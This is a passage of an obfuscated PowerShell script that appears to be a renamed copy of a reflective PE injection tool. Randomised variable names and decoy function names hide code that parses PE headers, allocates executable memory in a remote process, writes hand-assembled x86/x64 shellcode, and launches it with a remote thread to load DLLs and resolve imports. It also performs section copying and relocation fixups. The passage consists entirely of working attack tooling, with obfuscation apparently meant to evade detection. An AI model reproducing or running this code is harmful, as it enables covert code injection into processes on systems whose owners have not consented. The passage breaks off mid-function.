        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($mczPkhvt99.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($mczPkhvt99.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($mczPkhvt99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($mczPkhvt99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$ziQXfthb99 = [IntPtr](Ute ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $ziQXfthb99
        }
        else
        {
            [IntPtr]$ziQXfthb99 = [IntPtr](Ute ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $ziQXfthb99
        }
        
        if (($mczPkhvt99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($mczPkhvt99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Aquinas
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $lFbCkSOL99,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $hQJhAsvc99
        )
        
        $oibAVeZV99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $eZEVgzSU99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($hQJhAsvc99)
        $YOgmInFc99 = [UIntPtr][UInt64]([UInt64]$eZEVgzSU99.Length + 1)
        $zMkqqWtb99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, $YOgmInFc99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($zMkqqWtb99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }
        [UIntPtr]$EAWVzaoc99 = [UIntPtr]::Zero
        $OIWYYWxv99 = $iAJTLnuo99.WriteProcessMemory.Invoke($lFbCkSOL99, $zMkqqWtb99, $hQJhAsvc99, $YOgmInFc99, [Ref]$EAWVzaoc99)
        
        if ($OIWYYWxv99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($YOgmInFc99 -ne $EAWVzaoc99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $geEPvBuJ99 = $iAJTLnuo99.GetModuleHandle.Invoke("kernel32.dll")
        $HTnDnmRK99 = $iAJTLnuo99.GetProcAddress.Invoke($geEPvBuJ99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$rLboOCCl99 = [IntPtr]::Zero
        if ($PEInfo.PE64Bit -eq $true)
        {
            $wgHOsQRz99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, $YOgmInFc99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($wgHOsQRz99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            $zIaQIMie99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $wRbcpBbh99 = @(0x48, 0xba)
            $mbbIbpVs99 = @(0xff, 0xd2, 0x48, 0xba)
            $MzmnbEdd99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $dNRVnNXQ99 = $zIaQIMie99.Length + $wRbcpBbh99.Length + $mbbIbpVs99.Length + $MzmnbEdd99.Length + ($oibAVeZV99 * 3)
            $EAgFmezT99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dNRVnNXQ99)
            $zQtagwHZ99 = $EAgFmezT99
            
            bashfully -Bytes $zIaQIMie99 -cLHURWJZ99 $EAgFmezT99
            $EAgFmezT99 = Ute $EAgFmezT99 ($zIaQIMie99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($zMkqqWtb99, $EAgFmezT99, $false)
            $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
            bashfully -Bytes $wRbcpBbh99 -cLHURWJZ99 $EAgFmezT99
            $EAgFmezT99 = Ute $EAgFmezT99 ($wRbcpBbh99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($HTnDnmRK99, $EAgFmezT99, $false)
            $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
            bashfully -Bytes $mbbIbpVs99 -cLHURWJZ99 $EAgFmezT99
            $EAgFmezT99 = Ute $EAgFmezT99 ($mbbIbpVs99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($wgHOsQRz99, $EAgFmezT99, $false)
            $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
            bashfully -Bytes $MzmnbEdd99 -cLHURWJZ99 $EAgFmezT99
            $EAgFmezT99 = Ute $EAgFmezT99 ($MzmnbEdd99.Length)
            
            $NkAiMBRi99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, [UIntPtr][UInt64]$dNRVnNXQ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($NkAiMBRi99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $OIWYYWxv99 = $iAJTLnuo99.WriteProcessMemory.Invoke($lFbCkSOL99, $NkAiMBRi99, $zQtagwHZ99, [UIntPtr][UInt64]$dNRVnNXQ99, [Ref]$EAWVzaoc99)
            if (($OIWYYWxv99 -eq $false) -or ([UInt64]$EAWVzaoc99 -ne [UInt64]$dNRVnNXQ99))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $TUBSeZNh99 = aggravation -eXFgjlah99 $lFbCkSOL99 -StartAddress $NkAiMBRi99 -iAJTLnuo99 $iAJTLnuo99
            $uaKDlBLQ99 = $iAJTLnuo99.WaitForSingleObject.Invoke($TUBSeZNh99, 20000)
            if ($uaKDlBLQ99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [IntPtr]$IpoomQLn99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($oibAVeZV99)
            $uaKDlBLQ99 = $iAJTLnuo99.ReadProcessMemory.Invoke($lFbCkSOL99, $wgHOsQRz99, $IpoomQLn99, [UIntPtr][UInt64]$oibAVeZV99, [Ref]$EAWVzaoc99)
            if ($uaKDlBLQ99 -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$rLboOCCl99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IpoomQLn99, [Type][IntPtr])
            $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $wgHOsQRz99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $NkAiMBRi99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$TUBSeZNh99 = aggravation -eXFgjlah99 $lFbCkSOL99 -StartAddress $HTnDnmRK99 -HxFHblGZ99 $zMkqqWtb99 -iAJTLnuo99 $iAJTLnuo99
            $uaKDlBLQ99 = $iAJTLnuo99.WaitForSingleObject.Invoke($TUBSeZNh99, 20000)
            if ($uaKDlBLQ99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$DeuMymnn99 = 0
            $uaKDlBLQ99 = $iAJTLnuo99.GetExitCodeThread.Invoke($TUBSeZNh99, [Ref]$DeuMymnn99)
            if (($uaKDlBLQ99 -eq 0) -or ($DeuMymnn99 -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$rLboOCCl99 = [IntPtr]$DeuMymnn99
        }
        
        $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $zMkqqWtb99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $rLboOCCl99
    }
    
    
    Function demurer
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $lFbCkSOL99,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $pxFpJOtQ99,
        
        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )
        $oibAVeZV99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $zrXEKhji99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        
        $XJlZlcRM99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $PEytfoLc99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, $XJlZlcRM99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($PEytfoLc99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }
        [UIntPtr]$EAWVzaoc99 = [UIntPtr]::Zero
        $OIWYYWxv99 = $iAJTLnuo99.WriteProcessMemory.Invoke($lFbCkSOL99, $PEytfoLc99, $zrXEKhji99, $XJlZlcRM99, [Ref]$EAWVzaoc99)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($zrXEKhji99)
        if ($OIWYYWxv99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($XJlZlcRM99 -ne $EAWVzaoc99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $geEPvBuJ99 = $iAJTLnuo99.GetModuleHandle.Invoke("kernel32.dll")
        $GYEoVwJW99 = $iAJTLnuo99.GetProcAddress.Invoke($geEPvBuJ99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
        
        $KAyjNTZV99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, [UInt64][UInt64]$oibAVeZV99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($KAyjNTZV99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        [Byte[]]$lkYKjQfo99 = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $hRqfuiHv99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $jsvxXWLB99 = @(0x48, 0xba)
            $ttjgYhEW99 = @(0x48, 0xb8)
            $dOODELlD99 = @(0xff, 0xd0, 0x48, 0xb9)
            $WgHGJvHn99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $hRqfuiHv99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $jsvxXWLB99 = @(0xb9)
            $ttjgYhEW99 = @(0x51, 0x50, 0xb8)
            $dOODELlD99 = @(0xff, 0xd0, 0xb9)
            $WgHGJvHn99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $dNRVnNXQ99 = $hRqfuiHv99.Length + $jsvxXWLB99.Length + $ttjgYhEW99.Length + $dOODELlD99.Length + $WgHGJvHn99.Length + ($oibAVeZV99 * 4)
        $EAgFmezT99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dNRVnNXQ99)
        $zQtagwHZ99 = $EAgFmezT99
        
        bashfully -Bytes $hRqfuiHv99 -cLHURWJZ99 $EAgFmezT99
        $EAgFmezT99 = Ute $EAgFmezT99 ($hRqfuiHv99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($pxFpJOtQ99, $EAgFmezT99, $false)
        $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
        bashfully -Bytes $jsvxXWLB99 -cLHURWJZ99 $EAgFmezT99
        $EAgFmezT99 = Ute $EAgFmezT99 ($jsvxXWLB99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($PEytfoLc99, $EAgFmezT99, $false)
        $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
        bashfully -Bytes $ttjgYhEW99 -cLHURWJZ99 $EAgFmezT99
        $EAgFmezT99 = Ute $EAgFmezT99 ($ttjgYhEW99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GYEoVwJW99, $EAgFmezT99, $false)
        $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
        bashfully -Bytes $dOODELlD99 -cLHURWJZ99 $EAgFmezT99
        $EAgFmezT99 = Ute $EAgFmezT99 ($dOODELlD99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($KAyjNTZV99, $EAgFmezT99, $false)
        $EAgFmezT99 = Ute $EAgFmezT99 ($oibAVeZV99)
        bashfully -Bytes $WgHGJvHn99 -cLHURWJZ99 $EAgFmezT99
        $EAgFmezT99 = Ute $EAgFmezT99 ($WgHGJvHn99.Length)
        
        $NkAiMBRi99 = $iAJTLnuo99.VirtualAllocEx.Invoke($lFbCkSOL99, [IntPtr]::Zero, [UIntPtr][UInt64]$dNRVnNXQ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($NkAiMBRi99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        
        $OIWYYWxv99 = $iAJTLnuo99.WriteProcessMemory.Invoke($lFbCkSOL99, $NkAiMBRi99, $zQtagwHZ99, [UIntPtr][UInt64]$dNRVnNXQ99, [Ref]$EAWVzaoc99)
        if (($OIWYYWxv99 -eq $false) -or ([UInt64]$EAWVzaoc99 -ne [UInt64]$dNRVnNXQ99))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $TUBSeZNh99 = aggravation -eXFgjlah99 $lFbCkSOL99 -StartAddress $NkAiMBRi99 -iAJTLnuo99 $iAJTLnuo99
        $uaKDlBLQ99 = $iAJTLnuo99.WaitForSingleObject.Invoke($TUBSeZNh99, 20000)
        if ($uaKDlBLQ99 -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        [IntPtr]$IpoomQLn99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($oibAVeZV99)
        $uaKDlBLQ99 = $iAJTLnuo99.ReadProcessMemory.Invoke($lFbCkSOL99, $KAyjNTZV99, $IpoomQLn99, [UIntPtr][UInt64]$oibAVeZV99, [Ref]$EAWVzaoc99)
        if (($uaKDlBLQ99 -eq $false) -or ($EAWVzaoc99 -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$BterjAeY99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IpoomQLn99, [Type][IntPtr])
        $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $NkAiMBRi99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $PEytfoLc99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $iAJTLnuo99.VirtualFreeEx.Invoke($lFbCkSOL99, $KAyjNTZV99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $BterjAeY99
    }
    Function spoor
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $xyBDLqMD99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$ziQXfthb99 = [IntPtr](Ute ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_SECTION_HEADER)))
            $UVyGHszM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ziQXfthb99, [Type]$EdirUAaY99.IMAGE_SECTION_HEADER)
        
            [IntPtr]$zIGMvmQP99 = [IntPtr](Ute ([Int64]$PEInfo.PEHandle) ([Int64]$UVyGHszM99.VirtualAddress))
            
            $sHKrZKhN99 = $UVyGHszM99.SizeOfRawData
            if ($UVyGHszM99.PointerToRawData -eq 0)
            {
                $sHKrZKhN99 = 0
            }
            
            if ($sHKrZKhN99 -gt $UVyGHszM99.VirtualSize)
            {
                $sHKrZKhN99 = $UVyGHszM99.VirtualSize
            }
            
            if ($sHKrZKhN99 -gt 0)
            {
                commemorative -QkQUtuMd99 "spoor::MarshalCopy" -PEInfo $PEInfo -StartAddress $zIGMvmQP99 -Size $sHKrZKhN99 | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($xyBDLqMD99, [Int32]$UVyGHszM99.PointerToRawData, $zIGMvmQP99, $sHKrZKhN99)
            }
        
            if ($UVyGHszM99.SizeOfRawData -lt $UVyGHszM99.VirtualSize)
            {
                $fdrNNXly99 = $UVyGHszM99.VirtualSize - $sHKrZKhN99
                [IntPtr]$StartAddress = [IntPtr](Ute ([Int64]$zIGMvmQP99) ([Int64]$sHKrZKhN99))
                commemorative -QkQUtuMd99 "spoor::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $fdrNNXly99 | Out-Null
                $iAJTLnuo99.memset.Invoke($StartAddress, 0, [IntPtr]$fdrNNXly99) | Out-Null
            }
        }
    }
    Function Green
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $CyQKpuSs99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99
        )
        
        [Int64]$NiDapBKo99 = 0
        $XashOJoM99 = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$zLXPIerh99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_BASE_RELOCATION)
        
        if (($CyQKpuSs99 -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }
        elseif ((audiovisual ($CyQKpuSs99) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $NiDapBKo99 = creaking ($CyQKpuSs99) ($PEInfo.EffectivePEHandle)
            $XashOJoM99 = $false
        }
        elseif ((audiovisual ($PEInfo.EffectivePEHandle) ($CyQKpuSs99)) -eq $true)
        {
            $NiDapBKo99 = creaking ($PEInfo.EffectivePEHandle) ($CyQKpuSs99)
        }
        
        [IntPtr]$xSQrzecq99 = [IntPtr](Ute ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            $uskvETjC99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xSQrzecq99, [Type]$EdirUAaY99.IMAGE_BASE_RELOCATION)
            if ($uskvETjC99.SizeOfBlock -eq 0)
            {
                break
            }
            [IntPtr]$idVAhHYD99 = [IntPtr](Ute ([Int64]$PEInfo.PEHandle) ([Int64]$uskvETjC99.VirtualAddress))
            $fJbuzYQs99 = ($uskvETjC99.SizeOfBlock - $zLXPIerh99) / 2
            for($i = 0; $i -lt $fJbuzYQs99; $i++)
            {
                $tqYOwgVZ99 = [IntPtr](Ute ([IntPtr]$xSQrzecq99) ([Int64]$zLXPIerh99 + (2 * $i)))
                [UInt16]$jZyIXsht99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tqYOwgVZ99, [Type][UInt16])
                [UInt16]$KimJErXN99 = $jZyIXsht99 -band 0x0FFF
                [UInt16]$VpyVFpLs99 = $jZyIXsht99 -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $VpyVFpLs99 = [Math]::Floor($VpyVFpLs99 / 2)
                }
                if (($VpyVFpLs99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($VpyVFpLs99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    [IntPtr]$zQegxRkh99 = [IntPtr](Ute ([Int64]$idVAhHYD99) ([Int64]$KimJErXN99))
                    [IntPtr]$csjvpjce99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zQegxRkh99, [Type][IntPtr])
        
                    if ($XashOJoM99 -eq $true)
                    {
                        [IntPtr]$csjvpjce99 = [IntPtr](Ute ([Int64]$csjvpjce99) ($NiDapBKo99))
                    }
                    else
                    {
                        [IntPtr]$csjvpjce99 = [IntPtr](creaking ([Int64]$csjvpjce99) ($NiDapBKo99))
                    }               
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($csjvpjce99, $zQegxRkh99, $false) | Out-Null
                }
                elseif ($VpyVFpLs99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    Throw "Unknown relocation found, relocation value: $VpyVFpLs99, relocationinfo: $jZyIXsht99"
                }
            }
            
            $xSQrzecq99 = [IntPtr](Ute ([Int64]$xSQrzecq99) ([Int64]$uskvETjC99.SizeOfBlock))
        }
    }
    Function obstructiveness
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $EdirUAaY99,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $lFbCkSOL99
        )
        
        $IzqzBWUw99 = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $IzqzBWUw99 = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$QjekBmVX99 = Ute ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ErtDGziO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QjekBmVX99, [Type]$EdirUAaY99.IMAGE_IMPORT_DESCRIPTOR)
                
                if ($ErtDGziO99.Characteristics -eq 0 `
                        -and $ErtDGziO99.FirstThunk -eq 0 `
                        -and $ErtDGziO99.ForwarderChain -eq 0 `
                        -and $ErtDGziO99.Name -eq 0 `
                        -and $ErtDGziO99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }
                $qkFEEaWO99 = [IntPtr]::Zero
                $hQJhAsvc99 = (Ute ([Int64]$PEInfo.PEHandle) ([Int64]$ErtDGziO99.Name))
                $eZEVgzSU99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($hQJhAsvc99)
                
                if ($IzqzBWUw99 -eq $true)
                {
                    $qkFEEaWO99 = Aquinas -lFbCkSOL99 $lFbCkSOL99 -hQJhAsvc99 $hQJhAsvc99
                }
                else
                {
                    $qkFEEaWO99 = $iAJTLnuo99.LoadLibrary.Invoke($eZEVgzSU99)
                }
                if (($qkFEEaWO99 -eq $null) -or ($qkFEEaWO99 -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $eZEVgzSU99"
                }
                
                [IntPtr]$uTknPMHP99 = Ute ($PEInfo.PEHandle) ($ErtDGziO99.FirstThunk)
                [IntPtr]$fnStFOgQ99 = Ute ($PEInfo.PEHandle) ($ErtDGziO99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$sHWxHcIo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fnStFOgQ99, [Type][IntPtr])
                
                while ($sHWxHcIo99 -ne [IntPtr]::Zero)
                {
                    $XAFFNnqc99 = ''
                    [IntPtr]$jgQLfknV99 = [IntPtr]::Zero
                    if([Int64]$sHWxHcIo99 -lt 0)
                    {
                        $XAFFNnqc99 = [Int64]$sHWxHcIo99 -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$fkmrqqmX99 = Ute ($PEInfo.PEHandle) ($sHWxHcIo99)
                        $fkmrqqmX99 = Ute $fkmrqqmX99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $XAFFNnqc99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($fkmrqqmX99)
                    }
                    
                    if ($IzqzBWUw99 -eq $true)
                    {
                        [IntPtr]$jgQLfknV99 = demurer -lFbCkSOL99 $lFbCkSOL99 -pxFpJOtQ99 $qkFEEaWO99 -FunctionName $XAFFNnqc99
                    }
                    else
                    {
                        if($XAFFNnqc99 -is [string])
                        {
                            [IntPtr]$jgQLfknV99 = $iAJTLnuo99.GetProcAddress.Invoke($qkFEEaWO99, $XAFFNnqc99)
                        }
                        else
                        {
                            [IntPtr]$jgQLfknV99 = $iAJTLnuo99.GetProcAddressOrdinal.Invoke($qkFEEaWO99, $XAFFNnqc99)
                        }
                    }
                    
                    if ($jgQLfknV99 -eq $null -or $jgQLfknV99 -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $XAFFNnqc99. Dll: $eZEVgzSU99"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($jgQLfknV99, $uTknPMHP99, $false)
                    
                    $uTknPMHP99 = Ute ([Int64]$uTknPMHP99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$fnStFOgQ99 = Ute ([Int64]$fnStFOgQ99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$sHWxHcIo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fnStFOgQ99, [Type][IntPtr])
                }
                
                $QjekBmVX99 = Ute ($QjekBmVX99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EdirUAaY99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }
    Function Pasadena
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $KOlJGHex99
        )
        
        $fwKlKBWR99 = 0x0
        if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $fwKlKBWR99 = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($KOlJGHex99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $fwKlKBWR99 = $fwKlKBWR99 -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $fwKlKBWR99
    }
    Function provides
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $iAJTLnuo99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
